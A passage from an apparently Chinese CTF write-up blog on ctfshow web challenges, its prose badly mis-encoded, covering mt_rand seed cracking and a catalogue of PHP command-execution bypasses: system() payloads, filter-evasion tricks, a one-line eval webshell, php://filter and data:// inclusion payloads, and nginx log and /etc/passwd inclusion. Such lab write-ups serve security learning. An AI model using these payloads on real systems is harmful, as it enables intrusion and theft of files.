ã€‚ä¸“é—¨ç”¨æ¥è·‘mt_srand()ç§å­å’Œ mt_rand()éšæœºæ•°ã€‚</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/509478bc7d684369b08ac08f664cf67b.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç§å­æ¶‰åŠåˆ°flagï¼Œä¸èƒ½ç›´æ¥æ±‚åˆ°</span><br><span class="line"><span class="keyword">if</span>((!<span class="variable">$rand</span>)) è¦ä½¿è¿™ä¸ªä¸ºçœŸï¼Œå°±è¦è®© <span class="variable">$rand</span>=<span class="number">0</span> ï¼Œ</span><br><span class="line">è€Œ <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()) </span><br><span class="line">æ‰€ä»¥è¦å¾—åˆ°éšæœºæ•°æ‰èƒ½æ„é€  <span class="variable">$r</span>=<span class="variable">$mt_rand</span>() ã€‚</span><br></pre></td></tr></table></figure><p>å…ˆä¼ å‚<code>/?r=0</code>è·å–ç”Ÿæˆéšæœºæ•°çš„è´Ÿå€¼ã€‚</p><p>å†è¿›è¡Œ<code>./php_mt_seed éšæœºæ•°</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1267174464</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span>=<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠr&#x3D;1267174464å’Œtokenæ”¾åˆ°cookieä¸­ä¼ å…¥ï¼Œå³å¯è·å–flagã€‚</p></li></ul><h4><span id="web28">web28</span></h4><ul><li><p>ä¸€å¼€å§‹ä¸‰ä¸ªä½ç½®ä¸€èµ·çˆ†ç ´ï¼Œæ²¡æˆåŠŸï¼Œçœ‹ç½‘ä¸Šwp</p><p>å¦‚æœä¿®æ”¹æœ€åçš„2.txtä¼šè¢«æ— é™é‡å®šå‘ï¼Œä¸åˆ é™¤2.txtåªä¿®æ”¹å‰é¢çš„0å’Œ1ä¾æ—§ä¼šè¢«æ— é™é‡å®šå‘ã€‚</p></li><li><p>å› æ­¤åˆ æ‰æœ€å2.txtï¼Œç”¨é›†æŸç‚¸å¼¹æ¨¡å¼çˆ†ç ´å‰ä¸¤ä¸ªæ•°å­—å³å¯ã€‚</p></li></ul><h3><span id="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</span></h3><h4><span id="å‘½ä»¤æ‰§è¡Œæ–¹æ³•æ±‡æ€»">å‘½ä»¤æ‰§è¡Œæ–¹æ³•æ±‡æ€»</span></h4><p>ä½†æ˜¯å‡å¦‚æˆ‘ä»¬å¹¶ä¸çŸ¥é“flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ<br>æ–°æ‰‹å¯ä»¥ç­‰æ–‡ä»¶åŒ…å«éƒ¨åˆ†å­¦è¿‡æ¥å†å­¦ã€‚ æˆ‘ä»¬é€šè¿‡å“åº”å¤´ï¼Œå‘ç°æ˜¯nginxï¼Œé»˜è®¤nginxæ—¥å¿—æ–‡ä»¶åœ¨&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log ç»“åˆè¿™é‡Œçš„includeï¼Œæ„é€ å¦‚ä¸‹è¯­å¥ï¼Œä¹Ÿå¯ä»¥å°è¯•å…ˆ&#x2F;etc&#x2F;passwdï¼Œç¡®è®¤çš„ç¡®å¯ä»¥åŒ…å«ã€‚<code> http://dfa0bafe-3571-4a4a-9f0a-3766fb5a0a69.challenge.ctf.show/?c=include$_GET[a\]?%3E&amp;a=../../../../var/log/nginx/access.log</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>() <span class="comment">#æ˜¯PHPä¸­ä¸€ä¸ªå¸¸ç”¨çš„å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å˜é‡æ˜¯å¦å·²ç»è¢«è®¾ç½®å¹¶ä¸”é NULLã€‚å¦‚æœç»™å®šçš„å˜é‡å­˜åœ¨ä¸”å…¶å€¼ä¸ä¸º NULLï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› false</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>() <span class="comment">#æ˜¯PHPä¸­ç”¨äºæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨ç»™å®šçš„å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ¨¡å¼åŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œè¿”å› 1ï¼Œå¦åˆ™è¿”å› 0ã€‚è¯¥å‡½æ•°éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼šæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼å’Œè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚è¿˜å¯ä»¥ä¼ é€’ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå°†åŒ¹é…ç»“æœå­˜å‚¨åˆ°å…¶ä¸­ã€‚</span></span><br><span class="line"><span class="keyword">eval</span>() <span class="comment">#å‡½æ•°ç”¨äºå°†å­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚åœ¨æ‰§è¡Œæ—¶ï¼Œè¯¥å‡½æ•°å°†ä¼ é€’çš„å­—ç¬¦ä¸²ä½œä¸º PHP ä»£ç æ¥æ‰§è¡Œã€‚</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°èƒ½è¢«å½“ä½œphpä»£ç æ‰§è¡Œï¼Œåˆ™æˆ‘ä»¬ä½¿ç”¨ä¸€äº›ç³»ç»ŸæŒ‡ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>tacå¯ä»¥ç›´æ¥çœ‹åˆ°ï¼Œcatéœ€è¦åœ¨f12æºç é‡Œé¢çœ‹</li></ul><blockquote><p>ç©ºæ ¼å¯ä»¥ç”¨tab%09æ¥ç»•è¿‡</p><p>&lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ ${IFS}ã€$IFSã€$IFS$1</p><p>å¯¹äº;çš„è¿‡æ»¤å¯ä»¥ä½¿ç”¨?&gt;</p><p>%0a æ¢è¡Œç¬¦ä»£æ›¿ ;</p></blockquote><ul><li><p>æ–¹æ³•ä¸€ï¼šæ‹¼æ¥</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># urlç¼–ç åä½¿ç”¨%5cæ·»åŠ åˆ°flagä¸­</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">5</span>cag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># urlç¼–ç åä½¿ç”¨$9æ·»åŠ åˆ°flagä¸­</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$<span class="number">9</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># è¿˜å¯ä»¥ä½¿ç”¨&#x27;&#x27;å’Œ&quot;&quot;æ¥æ‹¼æ¥flag ä¾‹å¦‚ fl&#x27;&#x27;ag ï¼ˆç¼–ä¸ç¼–ç éƒ½è¯•è¯•çœ‹ï¼‰</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">22</span>%<span class="number">22</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ä½¿ç”¨ç‰¹æ®Šç¬¦å·$@</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$@ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># è¿‡æ»¤catåä¹Ÿå¯ä»¥é€šè¿‡åŠ æ–œæ è¾¾åˆ°ç»•è¿‡çš„æ–¹æ³• ca\t</span></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šä½¿ç”¨é€šé…ç¬¦</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨* cat fla*</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla*%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ä½¿ç”¨? cat fla?.php</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla%<span class="number">3</span>F%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ?å¯ä»¥å‡ºç°ä»»æ„æ¬¡</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>fla?.???%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åå¼•å·</p><ul><li>åå¼•å·çš„ä½œç”¨å°±æ˜¯å°†åå¼•å·å†…çš„Linuxå‘½ä»¤å…ˆæ‰§è¡Œï¼Œç„¶åå°†æ‰§è¡Œç»“æœèµ‹äºˆå˜é‡ã€‚</li><li>ç”± <code>&#39;&#39;</code> ç¬¦å·å¹¶ä¸ä¼šå½±å“å‘½ä»¤çš„æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ’å…¥è¿™äº›ç¬¦å·æ¥ç»•è¿‡ã€‚åœ¨linuxä¸­å¯ä»¥ä½¿ç”¨ â€™ æ¥ç»•è¿‡ï¼Œæ¯”å¦‚ flâ€™â€™ag å°±ç­‰æ•ˆäº flagã€‚</li><li><strong>echo &#96;&#96; å’Œ system(â€˜â€™) ç­‰ä»·</strong></li></ul>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?c=<span class="built_in">echo</span><span class="variable">%20`tac%</span><span class="number">20</span>fl<span class="variable">%27%</span><span class="number">27</span>ag.php`;</span><br><span class="line"># nl å‘½ä»¤ï¼šLinuxä¸­nlå‘½ä»¤å’Œcatå‘½ä»¤å¾ˆåƒï¼Œä¸è¿‡nlå‘½ä»¤ä¼šæ‰“ä¸Šè¡Œå·ï¼Œnlæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦f12æŸ¥çœ‹æºä»£ç </span><br><span class="line">/?c=<span class="built_in">echo</span> `nl fl?g.php`;</span><br><span class="line"># æ­¤å¤–ä¹Ÿå¯ä»¥ç”¨&#x27;&#x27;æ¥ç»•è¿‡è¿‡æ»¤</span><br><span class="line"><span class="built_in">echo</span> `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•å››ï¼šå¤åˆ¶å¤§æ³•</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cp fla* 1.txt,ç„¶åè®¿é—®ç›®å½•ä¸‹çš„1.txtå³å¯</span></span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># åŒç†ï¼Œå¦‚æœå±è”½systemï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨exec</span></span><br><span class="line">?c=<span class="title function_ invoke__">exec</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># åŒç†è¿˜æœ‰passthru</span></span><br><span class="line">/?c=<span class="title function_ invoke__">passthru</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äº”ï¼šåˆ©ç”¨å‚æ•°è¾“å…¥+eval</p><ul><li>ç”±äºç³»ç»Ÿåªä¼šæ£€æµ‹$cä¸­çš„å†…å®¹ï¼Œåˆ™æˆ‘ä»¬é€šè¿‡eval()å‡½æ•°æ„é€ å‚æ•°1å·§å¦™ç»•è¿‡</li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span></span><br><span class="line">/?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>flag.php%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•å…­ï¼šæ–‡ä»¶åŒ…å«</p><ul><li>ä½¿ç”¨includeå°†1åŒ…å«è¿›æ¥ï¼Œ1å†ä½¿ç”¨phpä¼ªåè®®ä½¿ç”¨PHPå†…éƒ¨è®¾ç½®çš„è¿‡æ»¤å™¨ï¼Œå°†flag.phpæ–‡ä»¶è¯»å–å¹¶ä»¥base64ç¼–ç çš„æ ¼å¼è¿”å›</li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…¶ä¸­$_GETä¹Ÿå¯ä»¥æ”¹æˆ$_REQUEST</span></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">require</span> <span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[a];&amp;a=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$_GET</span>[a];&amp;a=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•ä¸ƒï¼šä¸€å¥è¯æœ¨é©¬</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•å…«ï¼š</p><blockquote><p>localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚<br>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­å½“å‰å…ƒç´ ï¼ˆæŒ‡é’ˆæŒ‡å‘ï¼‰çš„å€¼ã€‚<br>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œæ•°ç»„ã€‚<br>array_reverse() å°†æ•°ç»„å€’åºè¾“å‡ºã€‚<br>next() å°†æŒ‡é’ˆæŒ‡å‘æ•°ç»„çš„ä¸‹ä¸€ä¸ªå…ƒç´ å¹¶è¾“å‡ºã€‚<br>show_source() å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºï¼Œæ˜¯highlight_file()åˆ«åã€‚</p></blockquote>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment"># ç­‰ä»·</span></span><br><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br><span class="line"><span class="comment"># å…¶ä¸­show_sourceå¯ä»¥æ¢æˆhighlight_fileå’Œreadfile</span></span><br></pre></td></tr></table></figure><blockquote><p>æ‰€ä»¥ï¼Œè¯­å¥çš„æ­¥éª¤æ˜¯<br>å…ˆæ‹¿åˆ°ä¸€ä¸ª.&#x3D;&#x3D;ã€‹localeconv() pos()</p><p>æ¥ç€æ‰«æ.ç›®å½•ï¼Œå³å½“å‰ç›®å½•&#x3D;&#x3D;ã€‹scandir()</p><p>å°†æ‰«æå®Œçš„ç›®å½•å€’å™&#x3D;ã€‹array_reverse(),å› ä¸ºæ­£åºç¬¬ä¸€ç¬¬äºŒåˆ†åˆ«æ˜¯: . ..</p><p>å°†å€’åºå®Œæ¯•çš„æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ è¾“å‡º&#x3D;&#x3D;ã€‹next() </p><p>â€‹- å› ä¸ºç›®å½•çš„é¡ºåºåˆ†åˆ«æ˜¯. .. flag.php index.phpå› æ­¤æˆ‘ä»¬å€’åºåç¬¬äºŒä¸ªæ˜¯flag.php</p><p>æ‰“å°æ–‡ä»¶ä¿¡æ¯&#x3D;&#x3D;ã€‹show_source()</p></blockquote></li><li><p>æ–¹æ³•ä¹ï¼š</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">RCE</a> </p><ul><li><p>å¯ä»¥é€šè¿‡</p><ul><li>$_GET</li><li>$_POST</li><li>$_FILES</li><li>$_COOKIE</li></ul><p><code>?c=eval(end(current(get_defined_vars())));&amp;a=system(&quot;cat flag.php&quot;);</code></p></li></ul></li></ul><h4><span id="web37">web37</span></h4><ul><li><p>çŸ¥è¯†ç‚¹</p><ul><li>è€ƒå¯Ÿdataåè®®</li></ul></li><li><p>dataä¼ªåè®®ï¼šå°†åé¢çš„å­—ç¬¦å½“åšPHPä»£ç æ‰§è¡Œ</p><p>data:&#x2F;&#x2F;ï¼Œç±»ä¼¼php:&#x2F;&#x2F;inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚</p><p><code>?c=data://text/plain;base64,[base64_encode_shell]</code></p><p>çœ‹æºä»£ç ï¼Œå› ä¸ºflag.phpæ³¨é‡Šæ³¨é‡Šäº†flagï¼Œæ‰€ä»¥çœ‹ä¸è§ï¼Œéœ€è¦æŸ¥çœ‹æºä»£ç ä¹Ÿå¯ä»¥ä½¿ç”¨tacæ¥è¯»å–ï¼Œç ´åphpçš„æ³¨é‡Šè§„åˆ™ï¼Œå°±å¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸Šçœ‹è§flagäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é¢˜è§£</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span></span><br><span class="line">/?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web41">web41</span></h4><p>è¿™ä¸ªé¢˜è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ä½¿å¾—<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦<code>|</code>ã€‚<br>æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚</p><p>ä»è¿›è¡Œå¼‚æˆ–çš„å­—ç¬¦ä¸­æ’é™¤æ‰è¢«è¿‡æ»¤çš„ï¼Œç„¶ååœ¨åˆ¤æ–­å¼‚æˆ–å¾—åˆ°çš„å­—ç¬¦æ˜¯å¦ä¸ºå¯è§å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå¯ç”¨å­—ç¬¦çš„é›†åˆ</span></span><br><span class="line"><span class="comment"># rce_or.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; 